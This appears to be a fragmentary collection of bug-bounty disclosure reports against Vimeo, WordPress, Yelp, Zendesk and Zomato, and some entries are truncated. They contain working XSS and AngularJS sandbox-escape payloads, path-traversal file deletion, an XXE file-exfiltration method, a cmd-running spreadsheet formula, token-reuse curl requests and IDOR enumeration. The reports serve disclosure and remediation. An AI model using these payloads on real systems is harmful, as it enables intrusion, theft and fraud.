The config file contains all the info about the video including the actual video file links, video title, owner vimeo account, ... which means that the attacker has complete access to the video.
Example of config file with token parameter s=[SECRET]

To resolve this issue, the https://vimeo.com/[VIDEO_ID]?action=share server should not include the token parameter s=[SECRET] of the config file in the error response of https://vimeo.com/[VIDEO_ID]?action=shareif the user doesn't have right to access the video.
There is a good chance this vulnerability is present in other links, especially other Ajax links.
In addition, if that is possible, the https://player.vimeo.com/video/[VIDEO_ID]/config config file server should also check that the user has valid right to access the video even if he has a correct s=[SECRET] token

Here is the source code of http://opnsec.com/vimeo/vl/videoLeak.php
If you need more info or if the POC doesn't work feel free to contact me.

Vimeo,1001-5000,0.0,50m-100m,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,APIs for channels allow HTML entities that may cause XSS issue,"artem  submitted a report to Vimeo.Jan 6th (8 years ago)Hello,
I found Vimeo's bug bounty program on [1]. Please find below details of a security issue I found.
First, APIs for channels [2] allow you to put HTML and javascript to name or description of a channel. For example, an attacker can use a Python script like the following to put javascript to an existing channel:
import httplib, urllib
server = ""api.vimeo.com""
endpoint = ""/channels/855545""
params = urllib.urlencode({'name': 'my channel<script>alert(document.cookie)</script>', 'description': 'bug bounty', 'privacy': 'anybody'})
headers = {""Authorization"": ""Bearer [token]"", ""Content-Type"": ""application/x-www-form-urlencoded""}
conn = httplib.HTTPSConnection(server)
conn.request(""PATCH"", endpoint, params, headers)
resp = conn.getresponse()
print resp.status, resp.reason
data = resp.read()
print data
conn.close()
I created a channel that contains javascript in description:
https://vimeo.com/channels/855545
Second, most of Vimeo's pages cut or encode HTML entities before they are printed out. For example, the page above doesn't execute the injected code. But I found at least two pages that don't encode HTML entities:
https://vimeo.com/album/create
https://vimeo.com/channels/<channel_id>/settings/videos
When you create an album you can add videos to this album (""Add videos to this Album"" select box on the page above). The select box contains channels you subscribed to or moderate. The page doesn't encode HTML entities when it builds the select box, so the code I injected to name of my channel is successfully executed on this page.
Technically this is a stored XSS vulnerability that allows to inject a javascript code on Vimeo's page. But it might be hard to exploit because an attacker needs to do the following:

make a victim subscribe to a malicious channel, or modify an existing channel a vicim has subscribed to
make a victim to open https://vimeo.com/album/create page
Both steps might be not so easy to do, but they are still possible.

I found some other APIs that allow to put HTML entities, but I have not checked all APIs. The problem may be fixed by making APIs encode or cut HTML entities, but it may probably cause some compatibility issues. Another way is to encode or cut HTML entities before channel name is printed out on the page above. This way, other Vimeo's pages need to be checked.

Vimeo,1001-5000,0.0,50m-100m,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Application XSS filter function Bypass may allow Multiple stored XSS,"securityidiots  submitted a report to Vimeo.Jan 18th (8 years ago)Hi,
As i analysed the application behavior and the security structure, i found out that the application is using ""Greedy XSS Regex filter"" against XSS and removes any the whole string from '<' to '>'. So i tried some basic bypass which allowed me to insert tags and other characters into the string.
Here is the the payload:
<%0crameset%20src=''> 
Now if we see the whole application is using same filter against XSS which makes this bypass to be universally working on nearly all the input fields, which means we can say an attacker can successfully bypass and enter XSS payload in database but when the string prints in the frontend there is another filter, which encode all html entities before printing.
Nice but now enough as many of the inputs could in the below condition will end up with a successful XSS exploitation.

Input under javascript.
Any string not properly encoded before printing.
JSON output with HTML headers.

I have already reported some issues in vimeo where input injected directly into javascript and do not need any html characters, another issue of JSON output with HTML headers. 
Below you can see both reports:
https://hackerone.com/reports/43934
https://hackerone.com/reports/44215

Vimeo,1001-5000,0.0,50m-100m,$250.00,No value,0.0,Privilege Escalation,CRITICAL vulnerability - Insecure Direct Object Reference - Unauthorized access to `Videos` of Channel whose privacy is set to `Private`.,"coolboss  submitted a report to Vimeo.Jan 31st (8 years ago)Hello,
This time I found a IDOR(Insecure Direct Object Reference) vulnerability. It allows an attacker to get unauthorized access to Videos of Channel whose privacy is set to Only moderators and people I choose without being a member.
In simple words, we can access videos of private channel without being member of it.
Proof Of Concept:


See this channel ---> https://vimeo.com/channels/870575
When opened it will show an error --->
Private Channel Sorry, this Channel is private. You do not have permission to view this Channel.


Now, I have a video placed there. Follow the steps to get access to my video.


Go to ---> https://vimeo.com/tools/widget/montage
(Use burp proxy and intercept the request mades.)


1st request --->  https://vimeo.com/tools/widget/montage
2nd request ---> https://vimeo.com/tools/widget/montage?widget=1&preview=1&user_id=36807051&badge_stream=channel&badge_channel=870575&badge_album=3231945&badge_layout=horizontal&badge_quantity=6&show_titles=no&badge_size=80
###Note badge_channel parameter to any value.
Open this link ---> https://vimeo.com/tools/widget/montage?widget=1&preview=1&user_id=36807051&badge_stream=channel&badge_channel=870575&badge_album=3231945&badge_layout=horizontal&badge_quantity=6&show_titles=no&badge_size=80
You will be shown my videos. Now keep enumerating badge_channel={any valid value}, it will get you access to any videos.

Game over ...! :D
This very dangerous as we can access any videos.

Video POC : ---> http://youtu.be/vRAtxovcfHs (It is an unlisted video on youtube.)
Hope to see this patched quickly. :-)

The server at https://ci.cameo.tv/ has directory listing on and seems to host quiet a few debian packages containing extremely sensitive information (database paswords, API keys, you name it). One example is the config package containing 16 config files, even personal ones containing local passwords etc.
I think it's pretty obvious but you need to IMMEDIATELY remove the possibility to access this server from the internet. I also think that you should check your logs for this server, and consider changing all the passwords possibly leaked.

WordPress,101-250,0.0,1m-10m,$350.00,High,7.7,None,[Buddypress] Arbitrary File Deletion through bp_avatar_set,"mopman  submitted a report to WordPress.Nov 20th (6 years ago)Hi,
The bp_avatar_set action in BuddyPress when cropping avatars allows an attacker to arbitrarily delete a file the webserver can delete through the 'original_file' parameter.
For example:

Create a user on a Buddypress-powered Wordpress instance (any user is OK, doesn't need to be admin, just needs to have the ability to change it's own avatar in the Buddypress profile which is normal).
Navigate to the avatar change URL for example /members/<username>/profile/change-avatar/ on my install.
Click the button to upload an image and select any valid image. Allow the first request which uploads this image to submit as normal.
Select the crop button, but do not allow the request to complete (I used Burp and enabled intercept mode). Modify the request to change the original_file parameter to point to a file you wish to delete, traversing up with ../.. if needed. So for example where my legitimate param was:

original_file=http%3A%2F%2Flocalhost%2F~sam%2Fwordpress%2Fwp-content%2Fuploads%2Favatars%2F2%2Fmy_ugly_face.jpg
Change to:
original_file=http%3A%2F%2Flocalhost%2F~sam%2Fwordpress%2Fwp-content%2Fuploads%2Favatars%2F2%2F../../../../../wp-config.php
Remember it will be in a numbered folder probably, so you need one more .. than expected from the URL. You can upload an image for real to see how the path ends up for guidance on this if you're an attacker and don't know the folder structure.
The wp-config.php file will be deleted when unlink() is called and the blog will then be unavailable, of course, in this case.
This path needs to be somehow validated such that it can only delete uploaded avatars (constraining to the upload directory would still allow you to delete, say, other users avatars, or other uploaded files, which would still make me sad :()
Let me know if you have any trouble reproducing or need any further info - I think I explained OK, but it is very late here. ;)

During my research on latest WordPress I found that $file_description  and $description from wp-admin/theme-editor.php  are not filtering name of the template allowing attacker to do XSS attack.

17<?php
18	endforeach;
19?>
From this code we can see that $file_description = get_file_description( $filename ); is getting declared and later on under <li><a> tags template name is printed on the page ...<?php echo $file_description; ?></a></li>
$file_description variable should be filtered before displayed to the user. For example using htmlspecialchars() function (example:  Wordpress_3.png (F175759) )
However, if victim click on the file that contain XSS payload, XSS will be executed because $description = get_file_description( $relative_file ); is displaying name of the active file you are editing.
Steps to replicate

Go to Appearance > Editor
Select file you want to edit (don't select files that already have name - Archives, Theme Footer for example). I used ""back-compat.php"" Wordpress_2.png (F175758)
At the very top of the file add following comment:
/* Template Name: <script>confirm(document.cookie);</script> */ Like this: Wordpress_2.png (F175758)

The WordPress core Media Library does not securely parse XML content when running on PHP 8. By uploading a malicious .wav file, an authenticated attacker can trigger a XXE vulnerability which enables to read secret system files, DoS the web server, perform SSRF, or aim at Remote Code Execution via Phar Deserialization.
Steps To Reproduce:
Requirements:

latest WordPress 5.6 installation
running on PHP 8
author user privileges in WordPress, or higher
another web server that is controlled by the attacker to retrieve leaked data

The vulnerability can be exploited by uploading a crafted .wav file. The attached archive contains such a .wav file with a payload for extracting the content of /etc/passwd by loading an external DTD. To reproduce:

Adapt the address in the 2 files in the attached PoC archive to point to a web server that you control (and that is reachable from the targeted WordPress installation).
For the .wav file, the address has to be adapted at 0x000338CD (best use a hex editor for this, doing that with a text editor might corrupt the file).
Put the file xxe.dtd at the root of the webserver that you control.
Login to WordPress as author and upload xxe.wav  in the media library.
The content of /etc/passwd will appear in the access logs of the web server base64 encoded (see attached screenshot).

Vulnerable Code:
The vulnerable code commit is the following:
https://github.com/WordPress/WordPress/commit/03eba7beb2f5b96bd341255eaa30d6b612e62507
The vulnerable code is:
Code 490 BytesWrap lines Copy Download1			if (PHP_VERSION_ID < 80000) {
2				// http://websec.io/2012/08/27/Preventing-XEE-in-PHP.html
3				// https://core.trac.wordpress.org/changeset/29378
4				// This function has been deprecated in PHP 8.0 because in libxml 2.9.0, external entity loading is
5				// disabled by default, so this function is no longer needed to protect against XXE attacks.
6				$loader = libxml_disable_entity_loader(true);
7			}
8			$XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);
It was recently modified to accommodate for the deprecation of the libxml_disable_entity_loader() function in PHP 8. The mistake here is to rely on the fact that XXE is no longer possible by default in PHP 8 (as it requires libxml version > 2.9). This is true, but using the LIBXML_NOENT flag is certainly not the default. The flag explicitly activates entity substitution (the name of the flag might be a little misleading). So if user input reaches that point as part of the $XMLstring variable, XXE is possible.
Impact
An attacker can:

read secret system files, such as .htaccess or wp-config.php
DoS the web server via a malicious XML document, or by loading /dev/urandom via XXE
fingerprint and exploit services in the internal network by turning the XXE into SSRF
trigger a Phar Deserialization by using the phar:// stream wrapper within the XXE which can lead to further vulnerabilities, depending on the gadget chains available in the WordPress core and its plugins.

I've confirmed the issue, and written a patch along the lines of what you suggest above. Could you please confirm that it solves the problem for you?
The BP team has already scheduled a release for tomorrow for unrelated reasons. If we're able to review and confirm the patch internally by then, we hope to include it. Otherwise, we are aiming to have another maintenance release that could contain this security fix within the following two weeks. I'll follow up here when I have more details about timeline.1 attachment:F235263: error-xss.diffskansing   posted a comment. Updated Nov 1st (5 years ago)Hi @boonebgorges - thanks for the response, I have tested the diff locally by overwritting the bp-plupload.min.js with the contents of a patched bp-plupload.js, I guess the minimized file is build somehow is the deploy/build process before release.

       I found a XSS issue in the https://mercantile.wordpress.org/s=<payload here>
This works with the angular js payloads. I did inject a angular js code its because I found the ng-bindable in the source.
STEPS TO REPRODUCE

Go to https://mercantile.wordpress.org
Click on search and put this payload:

{{     c=''.sub.call;b=''.sub.bind;a=''.sub.apply;     c.$apply=$apply;c.$eval=b;op=$root.$$phase;     $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;     C=c.$apply(c);$root.$$phase=op;$root.$digest=od;     B=C(b,c,b);$evalAsync(""     astNode=pop();astNode.type='UnaryExpression';     astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+';     astNode.argument={type:'Identifier',name:'foo'};     "");     m1=B($$asyncQueue.pop().expression,null,$root);     m2=B(C,null,m1);[].push.apply=m2;a=''.sub;     $eval('a(b.c)');[].push.apply=a; }}

WordPress,101-250,0.0,1m-10m,$350.00,High,7.95,Cross-site Scripting (XSS) - Generic,Wordpress 4.7.2 - Two XSS in Media Upload when file too large.,"skansing  submitted a report to WordPress.Feb 5th (6 years ago)Description
An attacker can inject a malicious script in to the filename which a victim tries to upload leading to XSS inside the administrators control panel.
Two different ""file to large"" cases end up in interpolating the file name and appending it into DOM unsanitized leading to XSS.
I have attached pictures of one of the cases, in the attached case the file was 12.4 MB, in a freshly installed environment. For reproduction note that any file type can be used (.jar whatever) as the vuln happens before the type is validated.
PoC
Create a 20MB file called 
Dinosaurs secret life<img src=x  onerror=alert(1)>.png
Goto your wordpress site http://127.0.0.1/wp-admin/media-new.php and dragndrop or use file manager or choose the file via. the ""Select Files"" button.
A error will appear with ... exceeds the maximum upload size for this site. along with a alert box to display that the payload has been executed.
Details on XSS
The file script-loader.php prepares an array of messages for use later.
Code 291 BytesWrap lines Copy Download1	// error message for both plupload and swfupload
2	$uploader_l10n = array(
3                ...
4		'file_exceeds_size_limit' => __('%s  exceeds the maximum upload size for this site.'),
5		'big_upload_failed' => __('Please try uploading this file with the %1$sbrowser uploader%2$s.'),
6		...
7	);
The payload will be injected into the %s in the key file_exceeds_size_limit.
This happens because the $uploader_l10n is passed to handlers.min.js (non minified version shown)
and interpolated without escaping the value previously.
First the value passes trough a error case 
Code 351 BytesWrap lines Copy Download1// $uploader_l10n
2case plupload.FILE_SIZE_ERROR:
3			uploadSizeError(uploader, fileObj); // fileObj contains the filename payload in name attribute.
4			break;
5....
6if ( max > hundredmb && fileObj.size > hundredmb )
7				wpFileError( fileObj, pluploadL10n.big_upload_failed.replace('%1$s', '<a class=""uploader-html"" href=""#"">').replace('%2$s', '</a>') );
and lastely interpolated and appended to the dom.
Code 502 BytesWrap lines Copy Download1
2function uploadSizeError( up, file, over100mb ) {
3	var message;
4
5	if ( over100mb )
6		message = pluploadL10n.big_upload_queued.replace('%s', file.name) + ' ' + pluploadL10n.big_upload_failed.replace('%1$s', '<a class=""uploader-html"" href=""#"">').replace('%2$s', '</a>');
7	else
8		message = pluploadL10n.file_exceeds_size_limit.replace('%s', file.name);
9
10
11	jQuery('#media-items').append('<div id=""media-item-' + file.id + '"" class=""media-item error""><p>' + message + '</p></div>');
12	up.removeFile(file);
13}
The critical lines are 
Code 264 BytesWrap lines Copy Download1message = pluploadL10n.big_upload_queued.replace('%s', file.name) + ' ' + pluploadL10n.big_upload_failed.replace('%1$s', '<a class=""uploader-html"" href=""#"">').replace('%2$s', '</a>');
2	else
3		message = pluploadL10n.file_exceeds_size_limit.replace('%s', file.name);
Suggested fix:

Vulnerable URL: https://wordpressfoundation.org/donate/
Clickjacking on the vulnerable URL allows an attacker to redirect a victim to do a donation at an attacker's page.
Steps To Reproduce:
1)  To test whether the page is vulnerable to clickjacking or not use this code
<!DOCTYPE HTML>
Code 324 BytesWrap lines Copy Download1<html lang=""en-US"">
2<head>
3<meta charset=""UTF-8"">
4<meta http-equiv=""refresh"" content=""5"">

10</center>
11</body>
12</html>
2) To test whether an attacker is able to trick the victim to donate money to the attacker's payment gateway
i) Open the attached page ""donation.html ""
ii) Click on the button give once
iii) The page will be redirected to the attacker's PayPal money request page.
*Sorry for the bad UI and please remove my payment-request id after the vulnerability check from donation.html page.
Recommendations
To control where your site can be embedded, use the frame-ancestors directive:
Content-Security-Policy: frame-ancestors 'none'  (The page cannot be displayed in a frame, regardless of the site attempting to do so.)
Content-Security-Policy: frame-ancestors 'self' (The page can only be displayed in a frame on the same origin as the page itself.)
Content-Security-Policy: frame-ancestors uri (The page can only be displayed in a frame on the specified origins.)
Impact
If an attacker is successful in tricking the victim to a click jacked page. He can trick the victim to donate money to the attacker's account. An attacker may also craft a page to gather victim's information, He may use also use BEEF hook id to take control of victim's browser.1 attachment:F904820: donation.htmlotto WordPress staff  updated the severity from medium to low. Jul 13th (2 years ago)otto WordPress staff  closed the report and changed the status to Resolved. Jul 13th (2 years ago)Thank you for the report!

And any reward ??otto WordPress staff  posted a comment. Jul 13th (2 years ago)Wordcamp.org has a different setup than the wordpressfoundation.org site, and frames are used for portions of that site.
However, that specific issue was already reported years ago, and mitigations for it are already in place. Specifically, different headers are sent on wordcamp.org for logged-in users than for logged-out ones, and there is no viable threat for logged-out users. Not all instances of ""clickjacking"" are valid.

Few Important function of yelp.com are vulnerable to ClickJacking Attack.
DESCRIPTION:
Please have an Introduction about the vulnerability Type: https://en.wikipedia.org/wiki/Clickjacking
ClikcJacking is similar to CSRF with just an extra involvement of the victim to click somewhere on the ClickJacked page (which is usually done very easily).
It bypasses CSRF token protection & Its impact could be critical depending on the component/function it can affect. At yelp.com I have found the following functions to be vulnerable:
##1.) Report A profile  (With custom Message in it)
Using URL:
https://www.yelp.com/flag_content?message=This%20person%20is%20abusive&flag_id=aV0sVlYtxt7_2SJ7X_b-3A&flag_type=user_profile&previous_url=%2Fuser_details%3Fuserid%3DaV0sVlYtxt7_2SJ7X_b-3A
##2.) Follow a user
Using URL:
https://www.yelp.com/following_user/add?dst_user_id=aV0sVlYtxt7_2SJ7X_b-3A&previous_url=/user_details?userid=aV0sVlYtxt7_2SJ7X_b-3A
##3.) Send A Compliment (With Custom message in it)**
Using URL:
https://www.yelp.com/thanx?message=go%20to%20hell&previous_url=/user_details?userid=aV0sVlYtxt7_2SJ7X_b-3A&user_id=aV0sVlYtxt7_2SJ7X_b-3A
POC:
PLEASE WATCH THE 1 minute POC VIDEO TO SEE HOW THESE URL ARE EMBEDDED INTO HIDDEN IFRAMES AND HOW THE VICTIM IS EXPLOITED. THE HTML FILES USED IN THE VIDEO ARE ATTACHED IN THIS REPORT
THE POC ALSO SHOWS THE IMPACT OF THE VULNERABILITY
MITIGATION
These attacks could be circumvented by using ""X-Frame-Options"" Header.
Impact
Such vulnerability when exploited in the wild by the attackers would :
1.) Affect the users interaction on your platform. Such unintended behavior is definitely not wanted by any user.
2.) Such effect upon your users could significantly harm your overall reputation and customer loss.4 attachments:F254262: Dangerous_ClickJacking_Yelp.flvF254263: Follow_User.htmlF254264: Report_a_USER.htmlF254265: Send_a_Compliment.html Bot:  posted a comment. Jan 16th (5 years ago)Hi there!

Thank you for your patience! We have started setting a Content-Security-Policy frame-ancestors header on these pages. This prevents these endpoints from being used in the described clickjacking attack. Please see the attached screenshot to see what this looks like on the user's end.

Yelp,5001-10000,0.0,200m-1b,$100.00,Low,2.0,Cross-Site Request Forgery (CSRF),Clickjacking Vulnerability found on Yelp,"hckyguy77  submitted a report to Yelp.Mar 17th (6 years ago)As many companies do, Yelp set its X-Frame-Options to SAME ORIGIN in its HTTP headers; but unfortunately our exploitation proves that not all the pages are protected.
With the use of iframes in the html document, I was able to discover a clickjacking vulnerabilities on Yelp.com, and this vulnerability could lead to a whole bunch of bad things happening to yelp and its users. Just like every other clickjacking issue, all of the issues I found rely on the ignorance of the user into visiting a link, while they are currently logged into yelp. Technically, an attacker can trick a yelp user to do anything or everything that they normally can do but wouldn't do, so this is like a CSRF attack, but it's worse than CSRF, as usually CSRF only causes one specific issue, but the clickjacking attack I have demonstrated here, can lead to many issues for Yelp users. Due to limited time and resource, I selected three issues to demonstrate and I recorded some videos to demonstrate them, but if needed, I can certainly demonstrate more issues due to this same vulnerability. Here are the introduction of the videos recorded in this report:
Tricking a user into unknowingly;
No.1: bookmarking unwanted business'
No.2: adding events to their profile they are interested in attending.
No. 3: editing their star rating on reviews;
More detailed explanation to each video:
No.1 trick_user_bookmark : This one is tricking the victim into bookmarking a page that they really may not want to have on their account. Since things like strip clubs are an option on yelps site, it can deface a person's account based on who is seeing the info. Which sharing with friends is very much apart of this site.
No.2 trick_user_into_add_event_to_profile = the victim thinks that they have won something cool and that they need to click on the link to secure the item. Doing so has added the event to their profile.
No.3 trick_user_to_edit_review = This one will rely on multiple clicks, but we can definitely assume that anyone clicking once, will probably keep clicking. Although the review will still sound positive, the rating of the company will not reflect on that.
No.4 trick_user_to_edit_review_withyelp_transparent = shows the vulnerability happening, while the user cannot see the yelp page. This one is pretty much the same as video No.3, but this time I made yelp.com transparent, so it is what would happen in real world attacks. When yelp.com is completely hidden, the user will have no idea.
I added video's to help give a visual representation of what is happening so that you may recreate this issue if you need to with ease.6 attachments:F169459: hack.htmlF169460: index.htmlF169461: trick_user_to_add_event_to_profile.mp4F169462: trick_user_bookmark.mp4F169463: trick_user_to_edit_review.mp4F169465: trick_user_to_edit_review_withyelp_transparent.mp4 Bot:  posted a comment. Mar 17th (6 years ago)Hi there!

https://www.linkedin.com/pulse/20141202104842-120953718-why-am-i-anxious-about-clickjacking/
In Yelp platform the response headers of the Reservation page does not contain the X-Frame-Options header, thus allowing malicious actors to embed these pages as hidden i-frames on some external or their own innocuous looking website.
Upon successful exploitation the victim would have made unintentional reservation to some restaurant/bar and his Email Id/Mobile Number would have been shared with the business.
All this would  happen without victim's  knowledge or consent.
Here's how a sample Reservation page looks like:

REQUEST RESPONSE HEADERS OF A RESERVATION PAGE:

Please note the missing X-Frame-Options header in the response headers.
POC:
For POC and steps to reproduce please watch the video 
EXPLOIT SCENARIOS:
Please look at the different scenarios this could be exploited :
==>(1) The attacker may himself register a business at yelp, copy and embed his own reservation url as hidden i-frame. Make reservation in the background upon victim's click. He gains email/mobile of the victim account.
==>(2) He may reserve a table of some business that charges upon cancellation and the victim may face monetary loss.
==>(3) He may target a business and  try to restrict all the genuine bookings. It would be possible to do so by booking all table slots of different timings from all the different visitors that are coming to his malicious but genuine looking website.
The impact of this vulnerability depends on the number of visitors attacker might be able to bring to his website. This is not a very big deal in the presence of huge social media websites nowadays. Or he may paste link to his website somewhere on yelp (review/about/talk etc sections) platform itself so as to bring authenticated yelp users to his website.
Impact
While the  overall risk may only be a medium rating; the impact is high as the vulnerability affects both the yelp users and also business owners
The vulnerability impacts the victim in the following ways:
==>1.) Loss of Confidentiality: Private info such as Email/phone is disclosed
==> 2.) Unauthorized Reservations from User Account: This certainly is not wanted by any user.
==> 3.) Monetary loss upon Cancellation of reservation: Some businesses say they would charge upon
cancellation of reservation.
==> 4.) Apart from this client's trust on Yelp platform is also lost.
The vulnerability impacts the business owners in the following ways:
==>1.) Fake reservations may restrict genuine reservations:
Such Fake reservations may restrict genuine users from booking tables. And on the other end the business owners have no way to distinguish between fake and genuine ones.
This leads to customer/monetary loss to business owners itself.3 attachments:F300310: REQUEST-RESPONSE_HEADERS.jpgF300311: EMBEDDED_IFRAME_ON_WEB_PAGE.flvF300312: sample_reservation_page.jpghk755a   posted a comment. May 27th (4 years ago)If there are any issues in the reproduction of the bug, i am more than willing to help out!

How it can be exploitable?
Attacker can make many hidden forms with pre-generated sign up fields to make accounts from victim's IP address (for example very cheap clickunder traffic on special HTML page with hidden form). Later created accounts can be used for spam purposes.
It can be done also with login and password forget endpoint: https://auto-api.yelp.com/account/login_secure
https://auto-api.yelp.com/account/send_password_email_secure

Zendesk,5001-10000,0.0,200m-1b,$100.00,No value,0.0,Privilege Escalation,[API ISSUE] agents can Create agents even after they are disabled ! ,"defmax  submitted a report to Zendesk.Aug 25th (7 years ago)Hey guys 
Description :
The Owner of the Zopim dashboard account has an ability to Create agents and disable then, while disabling the an agent , it restricts him to access him to login to the dash board (this is ohk ) but you are not expiring the access_tokens . if access_tokens are reused we could gain access to the account again ! 
Think of a situation where an Owner creates an agent and gives administration access, when the Owner comes to know that its attacker profile , he just disables it !  but disabling the account doesnt seems secure here , the account can be used via access_token
Steps to Reproduce !

Login to Owner account and Create an agent with administrator privilages 
Now Open another browser and login to agent account 
Create an client in agent account and Do the authorization and get down the access_token
Now go to Owner account and disable the agent
Now use this request 

Code 374 BytesWrap lines Copy Download1curl https://www.zopim.com/api/v2/agents \
2  -d '{
3        ""email"": ""attacker@attacker.com"", \
4        ""password"": ""secretpassword"", \
5        ""first_name"": ""attacker"", \
6        ""last_name"": ""Anon"", \
7        ""display_name"": ""Mr Robot"", \
8        ""enabled"": 1, \
9        ""im_server_id"": ""smith"", \
10      }' \
11  -v  \
12  -X POST -H ""Authorization: Bearer `access_token_here`""


You could create an account ! 

Simple Steps To verify

Login to  Agent account and Open this 


https://victim2-80.terminal.com/zopadmin.html



Now Click on "" Done have access_token? Click Here""
IT will prompt ""Allow Or Deny ""  , Click on Allow
Now it will show you the ""Access Token "", Copy it 
Now open Owner account and disable agent account 
Now go here again >> https://victim2-80.terminal.com/zopadmin.html
And give access_token there and Click on Submit 
An account will be created with email = lol@gmail.com  & password=csrfcsrf

Video POC :
https://www.youtube.com/watch?v=wZQTlmE0Lz8&feature=youtu.be 
(Sorry for low clarity :p )
Remediation :
Just expire the access_tokens when the account is disabled like you do when you ""delete"" the account 
Let me know if you need anything

Zendesk,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Cross-Site Request Forgery (CSRF),[CRITICAL] CSRF leading to account take over,"zombiehelp54  submitted a report to Zendesk.Nov 26th (7 years ago)Hi , I have found a CSRF issue in <your_zebdesk>.zendesk.com/jobs/createjob that leads to full account take over.
#Details:
When using bulk user import in https://<your_zendesk>.zendesk.com/import?kind=user after you upload a CSV file and press import , a request is sent to https://<your_zendesk>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=IozGNzPJIR1AniyrlueEIkLL8&job[update_records]=true&return_to=/people&type=user_import.
if you look at the request you'll see that the only token sent in the request is the job[token] value , so I have tried to change the url to https://<victim_account>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=IozGNzPJIR1AniyrlueEIkLL8&job[update_records]=true&return_to=/people&type=user_import , but the import failed and I received an email saying that there was an error when importing the users , but the error gave me a hint , This was the email: 
Code 272 BytesWrap lines Copy Download1For some reason the data to import was not ready in our servers. Try again.
2
3We've been notified about this and will solve the problem if there's a bug. If the error persists, please contact our support team. The error was:
4
5undefined method `attachments' for nil:NilClass
as you can see the error gives a hint that the job[token] parameter value is an id of the uploaded CSV file which can only be generated when uploading the csv file in the bulk user import page.
But , wait a second , it says attachments which mean it's actually an id of an attachment , so if the attacker signed up as an end user account and tried to submit a ticket then uploaded his csv file as an attachment and got the file id and replaced it with the job[token] parameter value , so the link will look like :
https://<victim_account>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=<uploaded_file_id>&job[update_records]=true&return_to=/people&type=user_import, it will work and if the attacker sent that link to an admin user and the admin visited it , a user with admin privileges will be added!

Zendesk,5001-10000,0.0,200m-1b,$50.00,No value,0.0,Command Injection - Generic,Chat History CSV Export Excel Injection Vulnerability,"pr0tagon1st  submitted a report to Zendesk.Feb 17th (7 years ago)I have found a vulnerability in the Chat History export function. If an attacker submits a special name (containing a system command) when chatting with an agent and that agent later exports the history of that chat to CSV, the resulting CSV may execute commands when opened. I have tested this using MS Excel 2013 on Windows 7.
Proof of Concept:

Open the dashboard as an agent and go to ""Visitor List"".
Select ""Simulate Visitor"". (This vulnerability works in a real scenario as well, simulating a visitor is just the easiest way to reproduce it).
As the simulated visitor, edit your name to ""-2+3+cmd|' /C calc'!G2"" (without the double quotes).
End the chat.
Navigate to the ""History"" section, select the recent chat, click the ""actions"" button, select ""export chat details"", and input a viable email address.
Open the email and unpack the zip file. 
Open the CSV in Excel.
A warning will show up warning the user to disable execution unless he trusts the source of the file. The user may likely leave execution enable due to trusting the source (zopim). Click ""enable"".
A second warning will appear that states a similar message as the previous one (""only open if you trust the source...""). Click ""yes""
The malicious code is executed - in this case it will just open the ""calc"" application. (Screenshot attached).

Threat Level Estimation
On one hand, this vulnerability can be pretty serious as it allows an attacker to execute arbitrary code as the current user. This can easily be used to download and install malware, establishing a firm foothold or to execute a pretty complex phishing attack (opening a browser, changing user settings, etc.) However, the severity of this attack is mitigated by the two warnings that I mentioned in the Proof of Concept. The warnings may be enough to dissuade the user from allowing Excel to execute the malicious code, although the both messages stress trusting the source and users have no reason to distrust zopim.com.
Recommendation
The ""="" is already escaped properly, this escaping should be extended to the ""-"" and ""+"" characters as well.
Let me know if I can help further.

This is similar to a vulnerability recently found in zendesk.com as well. When a team member clicks export as csv and opens it instead of seeing =AND(2>1) they see TRUE.  Meaning that cell is now active, and an attacker could make a chat request using a malicious function to execute malware on a team member's pc. 
Since functions aren't escaped, the possibilities of using this can be limitless and can cause a severe impact. One example is having it execute malware on staff's computer as seen below, leveraging cmd to execute commands. 
Crude Poc for executing cmd
use -2+3+cmd|' /C calc'!E1 and could execute malicious commands through CMD.
E1 is the cell it's located in.
Although excel has a feature to block this by tell a user that it wants to execute an external script, the team member would believe it's a trusted file coming from a trusted and have a high chance of this being executed. Seeing that it's generated by your site, they may believe it's an enhance functionalist of it to stream line, support. 
Best way to mitigate this vulnerability is if you append ' to the list of triggers, = , + , - Excel will ignore the ' and just show ='AND(2>1) instead

1.Decomiple the app.
2.Look for sensitive information

Impact
If an attacker decompiles your apk, and extracts your token, they can indeed maliciously send traffic on your behalf.
This is the case with pretty much every single one of the web  companies out there (google included).

So, when I looked up the cost of the membership was something which I wouldn't have afforded to take a risk. So, I decided to play around with the plan_id which was a numeric parameter being passed in the GET REQUEST, so I started Intruder and bruteforced that parameter to find if there are any other plans available, and immediately after few mins I found where it was like I needed to pay 1 AED to become a GOLD Member. Ahh that was cool stuff, so I paid 1 AED and then the UPGRADE PLAN feature had a vulnerability in which the developers were not checking the plan amount, so I selected the plan_id for 1 Year and modified the request with our own amount ""0 AED"" and succeeded in getting a Premium Membership for 1 year at the cost of 1 AED. That was some interesting find to be honest.

8) I decided to try various other plain_Ids using burp intruder.
9) Using the intruder, I figured out that the plan_Id 147 has a membership cost of 0.

12) You are now a zomato gold member.
13) There is also a referral program in zomato. In this program, if your freind buys zomato gold using your referral code, you get another 1 month of free membership.
14) The attacker can create as many accounts as possible and share his referral code with these accounts, purchase free zomato gold from the new codes using the referral code and also get 1 month extended membership for each referral. (Image: extended_gold_by_1_month_sharing_voucher_code.png) 
RCA:

Some apis take in the plan_id and give the plan details in the response.
This makes it easier for the attacker to enumerate plan ids. 
Also, multiple plans are valid at the same time.

Possible Fixes:

Plan_ids should not be easily guessable.
Only required plans should be kept active and all other plans should be disabled.
If possible, for any payment made, have some extra checks when the payment_amount is zero.

Impact
An attacker can get zomato subscription free of cost for a month. Then using the referral code, he can extended the subscription by another month for each successful free referral using fake accounts.",https://hackerone.com/reports/511044,Haryana,India,Gurugram,2019,3,16,17,56

Cross Origin Resource Sharing Misconfiguration | Lead to sensitive information.
Description:
An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.
